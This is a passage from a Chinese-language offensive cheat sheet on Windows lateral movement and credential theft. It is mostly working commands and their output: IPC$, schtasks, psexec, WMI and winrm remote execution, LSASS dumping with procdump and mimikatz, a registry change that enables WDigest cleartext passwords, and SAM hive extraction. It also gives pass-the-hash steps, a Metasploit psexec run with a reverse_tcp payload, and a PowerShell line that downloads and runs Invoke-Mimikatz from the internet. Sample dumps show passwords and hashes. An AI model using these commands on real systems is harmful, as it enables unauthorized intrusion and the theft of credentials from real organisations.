    jamd
    meterpreter > keyscan_stop 
    Stopping the keystroke sniffer...
Keylogger(tip:可以把管理工具，如navicat,putty,SecureCRT,PLSQL设置记住密码)
ixkeylog,linux>=2.63 --redrain推荐
### 远程命令执行
at\schtasks\psexec\wmic\sc\ps
window 在工作组内用非 Administrator (SID!=500)其他管理员建立远程连接( wmi, ipc$ )，权限不是管理权限，可以改
LocalAccountTokenFilterPolicy = 1
    reg add  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system 
    /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
#### ipc$
开启共享，开445，139 port
    D:>net use \\192.168.1.254\c$ "pwd" /user:user     //连接192.168.1.254的IPC$共享，用unc路径
    如果是域用户 D:>net use \\192.168.1.254\c$ "pwd" /user:domain\user
    D:>copy srv.exe \\192.168.1.254\c$ //复制本地srv.exe到C根目录
    D:>net time \\192.168.1.254         //查时间
    D:>at \\192.168.1.254 10:50 srv.exe //用at命令在10点50分启动srv.exe (这里360会拦截)
    D:>net use \\192.168.1.254\c$ /del
#### Schtasks
这里schtasks用着很舒服:
    schtasks /create /tn mytask /s ip /tr F:\Desktop.exe /sc minute /mo 1  /F 每分运行1次  普通权限即可， /s参数 远程ip 用于ipc连接后，远程主机执行 ，/F 表示有重名直接覆盖和创建或删除修改计划不再确认
    schtasks /create /tn mytask /tr F:\Desktop.exe /sc minute /mo 1 /ru system /F  管理员权限运行
如果程序有参数用引号"C:\procdump64.exe -accepteula -ma lsass.exe lsass.dmp" schtasks
/Create /TN test /SC DAILY /ST 00:09 /TR notepad.exe /RU SYSTEM 内置命令前加"cmd /c"
    schtasks /create /tn mytask /tr "cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy41\windows\NTDS\ntds.dit c:\ntds.dit 2>&1 > c:\windows\temp\1.txt" /sc minute /mo 1  /f /ru system /s 172.17.1.1
    C:\jboss-5.1.0.GA\bin\>schtasks /create /tn mytask /s 172.17.1.1 /tr "C:\procdump64.exe -accepteula -ma lsass.exe lsass.dmp" /sc minute /mo 2
    SUCCESS: The scheduled task "mytask" has successfully been created.
    C:\jboss-5.1.0.GA\bin\>schtasks /Query /TN mytask /s 172.17.1.1
    Folder: \
    TaskName                                 Next Run Time          Status         
    ======================================== ====================== ===============
    mytask                                   16-05-2018 07:50:00    Ready          
    C:\jboss-5.1.0.GA\bin\>schtasks /Run /TN mytask /s 172.17.1.1
    Folder: \
    TaskName                                 Next Run Time          Status         
    ======================================== ====================== ===============
    mytask                                   16-05-2018 07:52:00    Ready          
    C:\jboss-5.1.0.GA\bin\>schtasks /Delete /TN mytask /F /s 172.17.1.1
    SUCCESS: The scheduled task "mytask" was successfully deleted.
#### psexec
psexec 不推荐用,创建服务并删除,产生日志，需要开共享
    psexec -r sanr \\192.168.1.101 -u user -p pass cmd -r 参数为创建的服务名 可能绕过检测
#### wmi(135)
wmi 如果防火墙开启无法连接，优点无日志，无落地(写入磁盘)，以下命令无回显，写入txt，type查看
    wmic /node:192.168.1.101 /user:admin /password:@!123QWW
    process call create "cmd.exe /c whoami"
##### wmiexec
cscript.exe //nologo wmiexec.vbs /shell 192.168.1.1 username password
如果没明文密码，pth后利用。 http://www.91ri.org/12908.html
#### winexe
winexe可以从Linux上远程执行windows命令（SMB），kali自带
    ./winexe --system -U 'Administrator%123123' //192.168.1.101 'cmd.exe /c whoami'
#### PsRemoting
2012 r2起,默认端口5985,系统自带远程管理winrs winrs -r:192.168.1.101 -u:administrator -p:pwd
ipconfig
### mimikatz + procdump 获得内存 hash
如果服务器是64位，要把Mimikatz进程迁移到一个64位的程序进程中，才能查看64位系统密码明文。32位任意
运行`procdump.exe -accepteula -ma lsass.exe
lsass.dmp`(管理权限)后lsass.dmp放到mimikatz.exe同目录，运行以下命令
    mimikatz.exe "sekurlsa::minidump lsass.dmp" "log" "sekurlsa::logonpasswords"
    C:\Windows\Temp\test\x64>mimikatz.exe
      .#####.   mimikatz 2.1.1 (x64) built on May  2 2018 00:26:52
     .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
     ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( PI:EMAIL )
     ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
     '## v ##'       Vincent LE TOUX             ( PI:EMAIL )
      '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
    mimikatz # sekurlsa::minidump lsass.dmp
    Switch to MINIDUMP : 'lsass.dmp'
    mimikatz # sekurlsa::logonPasswords full
    Opening : 'lsass.dmp' file for minidump...
    Authentication Id : 4 ; 484366552 (00000004:1cded8d8)
    Session           : RemoteInteractive from 4
    User Name         : admin
    Domain            : xx
    Logon Server      : WIN-VEG0FAB6OQS
    Logon Time        : 5/5/2018 11:49:44 AM
    SID               : S-1-5-21-970513389-3385549917-1141547890-1128
            msv :
             [00000003] Primary
             * Username : admin
             * Domain   : xx
             * NTLM     : xxxxxxxxxxxxxxxxxx
             * SHA1     : xxxxxxxxxxxxxxxxxxxxxx
             [00010000] CredentialKeys
             * NTLM     : xxxxxxxxxxxxxxxxxxxxxx
             * SHA1     : xxxxxxxxxxxxxxxxxx
            tspkg :
            wdigest :
             * Username : admin
             * Domain   : xx
             * Password : QWEad!@w123
            kerberos :
             * Username : admin
             * Domain   : xx
             * Password : QWEad!@w123
            ssp :
            credman :
    Authentication Id : 0 ; 2138016 (00000000:00209fa0)
    Session           : Service from 0
    User Name         : dmadmin
    Domain            : xx
    Logon Server      : WIN-VEG0FAB6OQS
    Logon Time        : 3/7/2018 3:23:17 PM
    SID               : S-1-5-21-970513389-3385549917-1141547890-1119
            msv :
             [00000003] Primary
             * Username : dmadmin
             * Domain   : xx
             * NTLM     : xxxxxxxxxxxxx
             * SHA1     : xxxxxxxxxxxx
             [00010000] CredentialKeys
             * NTLM     : xxxxxxxxxxxxxxxxxxxxx
             * SHA1     : xxxxxxxxxxxxxxxxxx
            tspkg :
            wdigest :
             * Username : dmadmin
             * Domain   : xx
             * Password : 1234!qw
            kerberos :
             * Username : dmadmin
             * Domain   : xx.com
             * Password : (null)
            ssp :
            credman :
导出当前 内存 hash，需要免杀过av等
    mimikatz.exe "privilege::debug" "log" "sekurlsa::logonpasswords"
    powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
Windows Server 2012,部分Windows Server 2008默认无法使用mimikatz导出明文口令
解决方法：启用Wdigest Auth
cmd:
    reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
powershell:
    Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 1
重启或者用户再次登录，能够导出明文口令  
[3gstudent自动Dump-Clear-Text-Password-after-KB2871997-installed](https://github.com/3gstudent/Dump-Clear-Password-after-KB2871997-installed)
### SAM-hash
管理权限：
    reg save HKLM\SYSTEM Sys.hiv
    reg save HKLM\SAM Sam.hiv
mimikatz:
    lsadump::sam /sam:Sam.hiv /system:Sys.hiv
    mimikatz # lsadump::sam /sam:SamBkup.hiv /system:SystemBkup.hiv
    Domain : MINI
    SysKey : 58699cc69ada69e9d859731bec45824d
    Local SID : S-1-5-21-687613702-1072107351-1410383080
    SAMKey : 339c56f87f46195ddd5158c018a973de
    RID  : 000001f4 (500)
    User : Administrator
      Hash NTLM: 22388b7da6d4e33b9ab1cdf631daff8c
    RID  : 000001f5 (501)
    User : Guest
    RID  : 000001f7 (503)
    User : DefaultAccount
    RID  : 000003ee (1006)
    User : HomeGroupUser$
      Hash NTLM: 73233a63fa3dd495142e3a362a921221
#### pass the hash
wmiexec普通权限即可  
    wmiexec -hashes 00000000000000000000000000000000:99b2b135c9e829367d9f07201b1007c3 TEST/test1@192.168.1.1 "whoami" //domain=TEST user=test1
or 需要管理权限
    mimikatz "privilege::debug" "sekurlsa::pth /user:abc /domain:test.local /ntlm:hash"
or
    meterpreter > run post/windows/gather/hashdump
    Administrator:500:xxxxxxxxxxxx9a224a3b108f3fa6cb6d:xxxxf7eaee8fb117ad06bdd830b7586c:::
    meterpreter > background
    msf > use exploit/windows/smb/psexec
    msf exploit(psexec) > set payload windows/meterpreter/reverse_tcp
    msf exploit(psexec) > set SMBuser Administrator
    msf exploit(psexec) > set SMBPass xxxxxxxxxxxx9a224a3b108f3fa6cb6d:xxxxf7eaee8fb117ad06bdd830b7586c
    msf exploit(psexec) > exploit